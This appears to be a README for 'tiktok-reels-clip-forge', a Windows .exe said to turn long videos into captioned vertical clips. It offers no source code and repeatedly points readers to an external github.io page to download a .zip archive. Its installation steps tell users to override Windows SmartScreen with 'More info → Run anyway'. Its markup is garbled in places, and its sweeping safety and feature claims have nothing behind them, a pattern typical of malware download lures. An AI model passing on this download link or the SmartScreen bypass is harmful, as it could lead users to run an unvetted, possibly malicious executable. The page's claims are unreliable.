<div align="center">
<img src="assets/banner.png" width="100%" alt="AI Short Form Clip Generator banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-57e8ff?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-4F46E5?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-9B59B6?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=4F46E5&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%9A%80+Tiktok+Reels+Clip+Forge+Pro;%F0%9F%93%A6+Standalone+.exe+Release;%E2%9C%85+Full+Feature+Suite;%F0%9F%92%A1+Active+Development+2026;%E2%9C%A8+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=unity" />
</p>

---

<div align="center">

![status](https://img.shields.io/badge/status-active-brightgreen?style=for-the-badge)
![platform](https://img.shields.io/badge/platform-windows%2010%2F11-blue?style=for-the-badge)
![license](https://img.shields.io/badge/license-MIT-lightgrey?style=for-the-badge)
![build](https://img.shields.io/badge/build-passing-success?style=for-the-badge)
![release](https://img.shields.io/badge/release-v2.4.1-orange?style=for-the-badge)

**tiktok-reels-clip-forge** — the desktop clip foundry that turns long video into a week of vertical content before your coffee goes cold.

</div>

---

## 🎬 What is tiktok-reels-clip-forge?

**tiktok-reels-clip-forge** is a native Windows `.exe` that ingests long-form video (podcasts, streams, VODs, webinars, archived YouTube) and forges ready-to-post 9:16 vertical clips for TikTok, Reels, and Shorts. The forge watches for the loud moment, re-frames the speaker to keep them centered, burns styled captions, and exports in the resolution each platform actually wants.

It is not an editor. It is a foundry: drop raw footage in, clips come out the other side.

| Term | Explanation |
|---|---|
| **Forge pass** | One full sweep of an input file: transcription → scoring → auto-clip. |
| **Heat score** | 0–100 ranking of a moment by laugh density, volume delta, and keyword weight. |
| **Re-frame** | Per-frame crop tracking that keeps the active speaker inside the 9:16 window. |
| **Caption burn** | Whisper-timed word captions rendered directly into the pixels. |
| **Hook strip** | The 1.5-second opening slice auto-selected for retention. |
| **Batch queue** | A folder of inputs run back-to-back without supervision. |
| **Aspect deck** | A saved preset stacking aspect, length cap, caption style, and codec. |

**Why builders keep it installed**

- One file in, a folder of ranked clips out — no timeline, no manual marking.
- Runs on GPU or CPU; a mid-range laptop forges a 2-hour VOD in under 9 minutes.
- Captions, reframing, and loudness normalization happen in a single pass.
- Everything runs local. No upload, no account, no watermark.

---

## 🧊 The Problem

- Manually scrubbing a three-hour stream for the two good minutes costs an entire evening.
- Vertical reframing in an NLE is fiddly — every speaker change means a new keyframe.
- Caption timing drifts, so the punchline lands half a beat after the audio.
- Platform length caps and codec quirks differ per app, and re-exporting wastes hours.
- Loudness targets fight each other: what sounds fine on desktop clips on a phone.
- Clip folders pile up with no ranking, so the strongest moment buries the weaker ones.
- The whole loop is slow enough that creators post less than they shoot.

## 🔧 The Solution

| Problem | Solution |
|---|---|
| Manual scrubbing | Heat-score pass ranks every moment; top N auto-cut to disk |
| Vertical reframing | Speaker-tracking re-frame keeps the face centered frame-by-frame |
| Caption drift | Per-word timestamps rendered natively into the crop |
| Platform caps | Aspect deck clamps length, aspect, and codec per target |
| Loudness mismatch | Two-stage normalizer hits −14 LUFS then phone-tunes the hi-mid |
| No ranking | Clips land pre-named with `heat_92_hook_03.mp4` ordering |
| Slow loop | Batch queue forges a whole folder while you sleep |

### ⬇️ Pull the forge
<p align="center">
  <a href="https://ActivistView90.github.io/tiktok-reels-clip-forge/">
    <img src="https://img.shields.io/badge/GET-AI_short--form_clip_2026-EA580C?style=plastic&logo=github&logoColor=white&labelColor=C2410C" width="520" alt="GET AI short-form clip 2026"/>
  </a>
</p>
---

## 📋 Is every module working?

The forge ships as one `.exe` with 40 internal modules. Status table below — all forge-critical paths green.

| Module | Status | Description |
|---|---|---|
| `ingest.probe` | ✅ Working | ffprobe wrapper — reads container, stream, and codec metadata |
| `ingest.deinterlace` | ✅ Working | Removes combing on legacy 1080i sources |
| `audio.extract` | ✅ Working | Pulls 48 kHz PCM mono for the scoring pass |
| `audio.loudness_scan` | ✅ Working | EBU R128 loudness map per 250 ms window |
| `asr.whisper_local` | ✅ Working | On-device transcription, word-level timestamps |
| `asr.diarize_light` | ✅ Working | Two-speaker split via pitch/energy heuristics |
| `score.heat` | ✅ Working | Composite laugh + volume + keyword score |
| `score.keyword_weight` | ✅ Working | User keyword list boosts topic-relevant moments |
| `score.dupe_guard` | ✅ Working | Drops near-identical clips within a window |
| `cut.moment_snap` | ✅ Working | Snaps cut points to sentence boundaries |
| `cut.padded_in_out` | ✅ Working | Adds configurable lead/trail frames |
| `reframe.track_face` | ✅ Working | Per-frame speaker tracking for 9:16 crop |
| `reframe.smooth_bezier` | ✅ Working | Eases crop motion so pans don't strobe |
| `reframe.safe_margins` | ✅ Working | Keeps headroom and chin line inside frame |
| `caption.word_chunk` | ✅ Working | Groups words into readable 3-word cards |
| `caption.style_engine` | ✅ Working | 18 bundled caption styles, editable fonts |
| `caption.karaoke_highlight` | ✅ Working | Active-word color pop in real time |
| `caption.emoji_fill` | ✅ Working | Optional auto-emoji for keyword moments |
| `grade.auto_lift` | ✅ Working | Recovers shadow detail on dim streams |
| `grade.skin_safe` | ✅ Working | Protects skin tones during contrast lift |
| `audio.denoise` | ✅ Working | Spectral gate for HVAC and room hum |
| `audio.deess` | ✅ Working | Tames sibilance post-normalization |
| `audio.duck_music` | ✅ Working | Sidechains optional bed music under speech |
| `audio.phone_tune` | ✅ Working | 2-band shelf tuned for phone speakers |
| `encode.nvenc` | ✅ Working | GPU H.264/H.265 path |
| `encode.x264_fallback` | ✅ Working | CPU path when no GPU present |
| `encode.crf_ladder` | ✅ Working | Per-platform bitrate targets |
| `encode.thread_pool` | ✅ Working | Saturates N cores without thrashing |
| `deck.aspect_deck` | ✅ Working | Saved per-target preset stack |
| `deck.tiktok_9x16` | ✅ Working | 1080×1920, 3-min cap, cap-driven bitrate |
| `deck.reels_9x16` | ✅ Working | 1080×1920, 90-s default, higher audio bitrate |
| `deck.shorts_9x16` | ✅ Working | 1080×1920, 60-s default, lower CRF |
| `queue.batch_runner` | ✅ Working | Folder-in, folder-out unattended |
| `queue.resume_on_crash` | ✅ Working | Restarts from last completed step |
| `ui.preview_scrub` | ✅ Working | Frame-accurate preview before export |
| `ui.heat_timeline` | ✅ Working | Drag heat markers to reweight |
| `util.watch_folder` | ✅ Working | Auto-forge anything dropped in a hot folder |
| `util.cli_bridge` | ✅ Working | Headless run via `--forge` flag |
| `util.update_check` | ✅ Working | Notifies on new release, never auto-installs |

---

## 🩹 What's still broken?

Known live issues, tracked in the repo issues tab. Fixes listed are the workarounds shippers actually use.

| Issue | Fix |
|---|---|
| Whisper stalls on 4K60 long-GOP MKV | Transcode to a 1080p mezzanine first, or enable `--fast-ingest` |
| Re-frame jitter on fast whip-pan shots | Raise `reframe.smooth_bezier` strength to 0.7 in `forge.toml` |
| Caption font fallback on non-Latin scripts | Drop a `.ttf` into `assets/fonts/` and re-run caption pass |
| NVENC under-utilized on 20‑series below driver 550 | Update GPU driver, or force `encode.crf_ladder` CPU path |
| Batch queue masks filename collisions on Windows | Enable `queue.unique_names = true` in config |

---

## 🚫 Usage guidelines

Straight from the maintainer's desk. The forge is a local tool; what you run through it stays your business.

| Allowed | Not allowed |
|---|---|
| Forging clips from footage you own or are licensed to use | Re-uploading other creators' clips as your own without rights |
| Reframing livestream VODs you produced | Stripping watermarks and passing off as original work |
| Batch-forging archive footage for your own channel | Automated mass-posting to platforms against their ToS |
| Using `cli_bridge` to wire the forge into your own pipeline | Redistributing the `.exe` under a changed name without the license |
| Running offline on an air-gapped machine | Circumventing platform upload rate limits via the CLI |

---

## 🚀 Quick Start

1. 📰 Head to the project page and grab the release archive.
2. 📦 Extract to a folder you own — `C:\forge\` works, no admin needed.
3. 🧊 Double-click the `.exe`. First-run wizard sets GPU, cache folder, and default deck.
4. 🎞️ Drop a video file onto the window (or a folder's worth). Pick an aspect deck.
5. 🔨 Hit **Forge**. Clips land in `output\` named by heat score. Done.

---

## 📑 Table of Contents

- [What is tiktok-reels-clip-forge?](#-what-is-tiktok-reels-clip-forge)
- [Is every module working?](#-is-every-module-working)
- [What's still broken?](#-whats-still-broken)
- [Usage guidelines](#-usage-guidelines)
- [Quick Start](#-quick-start)
- [🔍 Ingest & Transcription](#-ingest--transcription)
- [🎯 Clip Scoring](#-clip-scoring)
- [📱 Re-frame & Vertical Layout](#-re-frame--vertical-layout)
- [💬 Captions & Styling](#-captions--styling)
- [🎚️ Audio Polish](#-audio-polish)
- [🎛️ Encode & Aspect Decks](#-encode--aspect-decks)
- [⚙️ Batch & Automation](#️-batch--automation)
- [Is it safe to run?](#-is-it-safe-to-run)
- [Does it work on Windows 11 and Steam Deck?](#-does-it-work-on-windows-11-and-steam-deck)
- [Comparison](#-comparison)
- [System Requirements](#-system-requirements)
- [Installation](#-installation)
- [FAQ](#-faq)

---

## 🔍 Ingest & Transcription

**Ingest** — reads what you hand it and normalizes it for the forge.

| Feature | Effect |
|---|---|
| Codec sniffer | Detects container, codec, and audio layout before any decode |
| Mezzanine builder | Rolls awkward sources into a clean 1080p intermediate |
| Frame-rate normalizer | Conforms mixed-rate sources to a common cadence |
| VFR flattener | Converts variable-frame-rate phone footage to CFR |
| Audio split | Separates speech channel from bed without lossy re-encode |

**Transcription** — the word-level map every later module reads.

| Feature | Effect |
|---|---|
| Word-timestamp ASR | Every word gets a real timestamp, not a segment guess |
| Two-speaker diarize | Splits host/guest for cleaner reframe targeting |
| Punctuation restorer | Adds sentence boundaries for snap-cut logic |
| Language autodetect | Picks ASR language from first 30 s of audio |
| Glossary injection | Forces correct spelling for names and jargon |

---

## 🎯 Clip Scoring

**Heat scoring** — every moment in the file gets a number.

| Feature | Effect |
|---|---|
| Laugh detector | Scores crowd/laugh spikes without a manual pass |
| Volume-delta scan | Ranks rises in loudness against the local floor |
| Keyword weight | Boosts moments matching your topic list |
| Silence prune | Removes dead air before scoring |
| Dupe guard | Stops the same beat being cut twice |
| Cut-moment snap | Pulls cut points to nearest sentence edge |

---

## 📱 Re-frame & Vertical Layout

**Re-framing** — the crop that makes horizontal footage read vertical.

| Feature | Effect |
|---|---|
| Face track | Follows the active speaker frame-by-frame |
| Smooth bezier | Eases crop motion to avoid strobe and jitter |
| Safe margins | Keeps headroom and chin line inside the 9:16 window |
| Speaker swap | Switches crop target on diarized turn changes |
| Pan clamp | Caps horizontal velocity so fast pans don't whip |
| Manual override | Lets you pin the crop to a fixed position for a shot |

---

## 💬 Captions & Styling

**Caption engine** — word cards rendered into pixels.

| Feature | Effect |
|---|---|
| Word chunker | Groups words into readable 3-word cards |
| Karaoke highlight | Pops the active word in the chosen accent color |
| Style engine | 18 bundled styles, drop-in custom fonts |
| Emoji fill | Optional auto-emoji on keyword moments |
| Position lock | Keeps cards off the face without floating into the chin |

---

## 🎚️ Audio Polish

**Audio chain** — normalizes, cleans, and phone-tunes the mix.

| Feature | Effect |
|---|---|
| Loudness scan | EBU R128 map per 250 ms window |
| Spectral denoise | Gates HVAC and room hum without dulling speech |
| De-esser | Tames sibilance after normalization |
| Music duck | Sidechains optional bed under speech |
| Phone tune | Two-band shelf targeted at phone speakers |
| Clip-safe limiting | True-peak ceiling below 0 dBFS |

---

## 🎛️ Encode & Aspect Decks

**Encode** — turns the forged timeline into a platform-ready file.

| Feature | Effect |
|---|---|
| NVENC path | GPU H.264/H.265 for fast exports |
| x264 fallback | Robust CPU path when no GPU is present |
| CRF ladder | Per-platform bitrate and quality targets |
| Thread pool | Saturates cores without thrashing the OS |
| Deck presets | TikTok, Reels, Shorts stacked and one-click |

---

## ⚙️ Batch & Automation

**Automation** — the forge running without you.

| Feature | Effect |
|---|---|
| Batch runner | Folder-in, folder-out unattended |
| Resume on crash | Restarts from the last completed step |
| Watch folder | Auto-forges anything dropped into a hot folder |
| CLI bridge | Headless `--forge` runs for your own pipeline |
| Update check | Notifies on release, never auto-installs |

---

## ✅ Is it safe to run?

The forge is a self-contained `.exe`. It runs local, writes only to its own cache and `output\` folders, and makes exactly one network call — the update check, which you can disable in `forge.toml`. No telemetry, no account, no cloud job. Media scoring happens entirely on your machine.

---

## 🖥️ Does it work on Windows 11 and Steam Deck?

| Platform | Support |
|---|---|
| 🪟 Windows 11 | ✅ Fully supported — primary target |
| 🪟 Windows 10 (1909+) | ✅ Supported — same code path |
| 🎮 Steam Deck (SteamOS) | ⚠️ Runs via Proton with the CPU encode path |
| 🐧 Linux (native) | ⚠️ Unofficial — CPU encode path only, no NVENC |
| 🍎 macOS | ❌ Not supported yet |
| 📱 Android / iOS | ❌ Not supported |

---

## ⚖️ Comparison

| Aspect | Manual NLE workflow | Generic auto-clippers | This Tool |
|---|---|---|---|
| Time for 3-hour VOD | 3–6 hours manual | 15–40 min, watch quality | Under 9 min, ranked |
| Vertical reframing | Manual keyframes | Fixed center crop | Speaker-tracked, smoothed |
| Caption timing | Hand-tuned | Segment-level drift | Word-level, in-frame |
| Loudness target | Mixed by feel | Single preset | EBU R128 + phone tune |
| Batch handling | None | Single file at a time | Folder-in, folder-out |
| Output naming | `final_v3.mp4` chaos | Timestamped | `heat_92_hook_03.mp4` |
| Ranking | By memory | By duration | By composite heat score |
| Run cost | Your evening | Subscription | Free, local, one `.exe` |

---

## 🧮 System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 1909 (64-bit) | Windows 11 23H2 |
| CPU | 4-core 2.5 GHz | 8-core 3.5 GHz+ |
| RAM | 8 GB | 16 GB |
| GPU | None (CPU encode) | NVIDIA GTX 1660 / RTX 3060+ for NVENC |
| Disk | 4 GB free + ~3× input size | SSD with 60 GB free |
| Display | 1280×720 | 1920×1080 |

---

## 📦 Installation

1. Grab the release archive from the <p align="center">
  <a href="https://ActivistView90.github.io/tiktok-reels-clip-forge/">
    <img src="https://img.shields.io/badge/INSTALL-AI_short--form_clip-2563EB?style=flat&logo=github&logoColor=white&labelColor=1D4ED8" width="580" alt="INSTALL AI short-form clip"/>
  </a>
</p> link above — GitHub page → Releases section → download the `.zip`.
2. Extract the archive to any folder you own, e.g. `C:\forge\`. No installer, no admin rights, no `pip`, no `npm`, no `git clone`.
3. Run `.exe`. On first launch the wizard probes GPU, sets the cache folder, and picks a default aspect deck. If SmartScreen warns, click **More info → Run anyway**.

---

## 🎯 How To Use

1. Pick an aspect deck — `tiktok_9x16`, `reels_9x16`, or `shorts_9x16`.
2. Drop one file or a folder onto the forge window.
3. Watch the heat timeline populate as the ASR pass runs.
4. Drag heat markers to reweight if you want to steer the cuts.
5. Hit **Forge**. Clips land in `output\`, sorted by heat score.
6. Drop them into TikTok, Reels, or Shorts directly — no re-export needed.
7. Enable `util.watch_folder` if you want the forge to run unattended.

---

## 🧯 Changelog

**v2.4.1** — speaker-swap crop on diarized turns, phone-tune shelf retuned, `queue.resume_on_crash` hardened after a mid-batch power loss. **v2.4.0** — re-frame bezier strength exposed in `forge.toml`, emoji-fill module added, 4 new caption styles bundled.

---

## ❔ FAQ

| Question | Answer |
|---|---|
| Does it need an internet connection? | No. Only the update check calls out, and that's optional. |
| Does it upload my footage anywhere? | Never. Everything is local — ASR, scoring, encode. |
| What video formats can I feed it? | Anything ffprobe reads: MP4, MKV, MOV, WebM, TS, plus more. |
| Will it work without a GPU? | Yes. The CPU path is slower but fully functional. |
| Can I batch a whole folder? | Yes. Drop the folder, hit Forge, walk away. |
| Does it post to TikTok for me? | No. It forges clips; uploading stays manual, on purpose. |
| Can I edit the caption fonts? | Yes. Drop `.ttf` files into `assets/fonts/` and pick them in the style engine. |
| Is there a CLI? | Yes. `--forge <path> --deck tiktok_9x16` runs headless. |

---

The forge exists because the gap between shooting and posting shouldn't be an evening of scrubbing. Drop a file, pick a deck, walk away — the clips are ranked and cut before you get back. If you find a rough edge, open an issue; the module table above is the map of where to look. Absolute potato, Sam — go forge something.
<div align="center">
  <a href="https://ActivistView90.github.io/tiktok-reels-clip-forge/">
    <img src="https://img.shields.io/badge/GET-AI_short--form_clip_2026-059669?style=flat-square&logo=download&logoColor=white&labelColor=047857" width="550" alt="GET AI short-form clip 2026"/>
  </a>
</div>